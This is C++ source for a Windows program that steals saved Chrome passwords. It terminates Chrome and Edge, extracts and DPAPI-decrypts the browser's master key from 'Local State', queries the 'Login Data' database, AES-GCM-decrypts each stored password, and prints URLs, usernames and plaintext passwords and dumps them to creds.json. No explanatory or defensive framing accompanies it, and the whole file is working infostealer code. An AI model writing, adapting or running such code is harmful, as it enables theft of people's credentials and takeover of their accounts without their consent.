#pragma once
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <vector>
#include "json.hpp"
#include "sqlite3.h"
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")
using json = nlohmann::json;


BOOL isSuccessful(NTSTATUS status) {
	return status == STATUS_SUCCESS;
}


BOOL TerminateBrowsers(){
	BOOL success = TRUE;
	std::vector<std::string> denylist{ "chrome.exe", "msedge.exe" };

	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hTH32, &procEntry);
	do
	{
		//Convert wide string to string
		std::wstring ws(procEntry.szExeFile);
		std::string str(ws.begin(), ws.end());
		//If the name is in the vector, terminate it
		if (std::find(denylist.begin(), denylist.end(), str) != denylist.end()) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, NULL, procEntry.th32ProcessID);
			if (hProcess) {
				if (!TerminateProcess(hProcess, 0))
					success = FALSE;
			}
			else {
				success = FALSE;
			}
		}
	} while (Process32Next(hTH32, &procEntry));

	return success;
}

BOOL GetChromePath(TCHAR* chromePath) {
	const TCHAR* environmentVariableLocalAppData = TEXT("%LOCALAPPDATA%");
	const TCHAR* rest = TEXT("\\Google\\Chrome\\User Data");
	//const TCHAR* rest = TEXT("\\Microsoft\\Edge\\User Data");

	TCHAR localAppDataPath[MAX_PATH];
	if (ExpandEnvironmentStrings(environmentVariableLocalAppData, (LPWSTR)&localAppDataPath, MAX_PATH) == 0)
		return FALSE;
	std::wcout << "Profile: " << localAppDataPath << "\n";
	if (_snwprintf_s((wchar_t*)chromePath, (size_t)MAX_PATH, _TRUNCATE, TEXT("%s%s"), localAppDataPath, rest) < 0)
		return FALSE;
	std::wcout << "Chrome: " << chromePath << "\n";
	return TRUE;
}


std::string ExtractMasterKey(TCHAR* localStatePath) {
	HANDLE hLocalState = CreateFile(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	std::string enc_key = "";
	if (hLocalState == INVALID_HANDLE_VALUE) {
		std::wcout << "Invalid handle\n";
		return enc_key;
	}

	std::ifstream f(localStatePath);
	json data = json::parse(f);

	if (data.contains("os_crypt") && data["os_crypt"].contains("encrypted_key")) {
		enc_key = data["os_crypt"]["encrypted_key"];
		printf("%s\n", enc_key.c_str());
	}
	CloseHandle(hLocalState);
	return enc_key;
}


BOOL DecryptMasterKey(std::string enc_key, DATA_BLOB* decryptedData) {
	char* enc_key_char =(char*)enc_key.c_str();
	DWORD cbBinary = 0;

	// Before actually Base64 decoding, get the required size of pbBinary and writes it to cbBinary
	if (!CryptStringToBinaryA(enc_key_char, NULL, CRYPT_STRING_BASE64, NULL, &cbBinary, 0, NULL))
		return FALSE;
	BYTE* pbBinary = (BYTE*)malloc(cbBinary);
	if (!CryptStringToBinaryA(enc_key_char, NULL, CRYPT_STRING_BASE64, pbBinary, &cbBinary, 0, NULL)) {
		free(pbBinary);
		return FALSE;
	}
	//Verify that first 5 bytes are DPAPI
	if (memcmp(pbBinary, "DPAPI", strlen("DPAPI")) != 0) {
		free(pbBinary);
		return FALSE;
	}

	DATA_BLOB decodedData;
	decodedData.cbData = cbBinary - 5;
	decodedData.pbData = pbBinary + 5;

	decryptedData -> cbData = cbBinary;
	BYTE* pbData = (BYTE*)malloc(cbBinary);
	decryptedData -> pbData = pbData;

	if (!CryptUnprotectData(&decodedData, NULL, NULL, NULL, NULL, 0, decryptedData)) {
		LocalFree(decodedData.pbData);
		return FALSE;
	}
	LocalFree(decodedData.pbData);
	return TRUE;
}


const BYTE v10[] = { 'v', '1', '0' };
std::string DecryptData(LPCVOID pData, DWORD dwData, BYTE key[32])
{
	std::string ret = "";
	LPVOID pDataOut;
	DWORD dwDataOutLen;
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
	BCRYPT_ALG_HANDLE hAlgorithm;
	BCRYPT_KEY_HANDLE hKey;
	NTSTATUS nStatus;

	nStatus = BCryptOpenAlgorithmProvider(
		&hAlgorithm,
		BCRYPT_AES_ALGORITHM,
		NULL, 0
	);
	if (!isSuccessful(nStatus))
		std::cout << "Failed BCryptOpenAlgorithmProvider\n";
	nStatus = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!isSuccessful(nStatus))
		std::cout << "Failed BCryptSetProperty\n";
	nStatus = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, key, 32, 0);
	if (!isSuccessful(nStatus))
		std::cout << "Failed BCryptGenerateSymmetricKey\n";
	if ((dwData >= sizeof(v10)) && RtlEqualMemory(pData, v10, sizeof(v10)))
	{
		if (hAlgorithm && hKey)
		{
			BCRYPT_INIT_AUTH_MODE_INFO(info);
			info.pbNonce = (PBYTE)pData + sizeof(v10);
			info.cbNonce = 12;
			info.pbTag = info.pbNonce + dwData - (sizeof(v10) + 16);
			info.cbTag = 16; 
			dwDataOutLen = dwData - sizeof(v10) - info.cbNonce - info.cbTag;
			if (pDataOut = LocalAlloc(LPTR, dwDataOutLen))
			{
				nStatus = BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, &info, NULL, 0, (PUCHAR)pDataOut, dwDataOutLen, &dwDataOutLen, 0);
				if (isSuccessful(nStatus)) {
					std::string s = std::string((char*)pDataOut);
					ret = s.substr(0, dwDataOutLen);
				}
				else {
					std::wcout << L"BCryptDecrypt: 0x%08x\n", nStatus;
					LocalFree(pDataOut);
					ret = "";
				}
			}
		}
		else printf("No Alg and/or Key handle despite AES encryption\n");
	}
	return ret;
}


sqlite3* dbInit(TCHAR* pathToLoginData) {
	sqlite3* db;

	if (sqlite3_open16(pathToLoginData, &db)) {
		std::wcout << "Error opening database " << pathToLoginData << "\n";
		return NULL;
	} 
	return db;
}


BOOL dbParse(json j, std::string browser, sqlite3* db, BYTE masterkey[]) {
	sqlite3_stmt* pStmt;
	const char** pzTail = NULL;
	const char* query = "SELECT origin_url, username_value, password_value FROM logins";
	int rc = sqlite3_prepare_v3(db, query, strlen(query) + 1, 0, &pStmt, pzTail);
	if (rc != SQLITE_OK) {
		std::wcout << "Error with SQL prepare" << "\n";
		printf("%d: %s\n", rc, sqlite3_errstr(rc));
		return FALSE;
	}

	j["creds"][browser] = json();

	int i = 0;
	while (rc = sqlite3_step(pStmt), rc == SQLITE_ROW) {
		std::cout << sqlite3_column_text(pStmt, 0) << "\n";
		int encryptedDataSize = sqlite3_column_bytes(pStmt, 2);
		const void* passwordBlobEncrypted = sqlite3_column_blob(pStmt, 2);
		std::cout << "\t" << sqlite3_column_text(pStmt, 1) << ":" << DecryptData(passwordBlobEncrypted, encryptedDataSize, masterkey) << "\n";
		
		j["creds"][browser][i] = json();
		j["creds"][browser][i]["url"] = std::string((char*)sqlite3_column_text(pStmt, 0));
		j["creds"][browser][i]["user"] = std::string((char*)sqlite3_column_text(pStmt, 1));
		j["creds"][browser][i]["pass"] = DecryptData(passwordBlobEncrypted, encryptedDataSize, masterkey);
		i++;
	}

	if (sqlite3_finalize(pStmt) == SQLITE_OK)
		return TRUE;
	return FALSE;
}

BOOL dbClose(sqlite3* db) {
	if (sqlite3_close(db) != SQLITE_OK)
		return FALSE;
	return TRUE;
}

int main() {
	if (!TerminateBrowsers())
		return -666;


	TCHAR pathToChromeData[MAX_PATH];
	TCHAR pathToLoginData[MAX_PATH];
	TCHAR pathToLocalState[MAX_PATH];

	const TCHAR* loginData = TEXT("Login Data");
	const TCHAR* localState = TEXT("Local State");
	const TCHAR* defaultProfile = TEXT("Default");
	GetChromePath(pathToChromeData);

	if (_snwprintf_s((wchar_t*)pathToLocalState, (size_t)MAX_PATH, _TRUNCATE, TEXT("%s\\%s"), pathToChromeData, localState) < 0) {
		std::wcout << "Error :(\n";
		return -11;
	}
	std::wcout << "Local State: " << pathToLocalState << "\n";

	std::string enc_master = ExtractMasterKey(pathToLocalState);
	DATA_BLOB decryptedData;
	DecryptMasterKey(enc_master, &decryptedData);
	
	if (_snwprintf_s((wchar_t*)pathToLoginData, (size_t)MAX_PATH, _TRUNCATE, TEXT("%s\\%s\\%s"), pathToChromeData, defaultProfile, loginData) < 0) {
		std::wcout << "Error :(\n";
		return -12;
	}
	
	std::wcout << "Login Data: " << pathToLoginData << "\n";

	json j;
	j["creds"] = json();

	sqlite3* db = dbInit(pathToLoginData);
	if (db) {
		dbParse(j, std::string("chrome"), db, decryptedData.pbData);
		if (!dbClose(db))
			std::cout << "Could not close database\n";
	}
	std::ofstream o("creds.json");
	o << std::setw(4) << j << std::endl;

	return 0;
}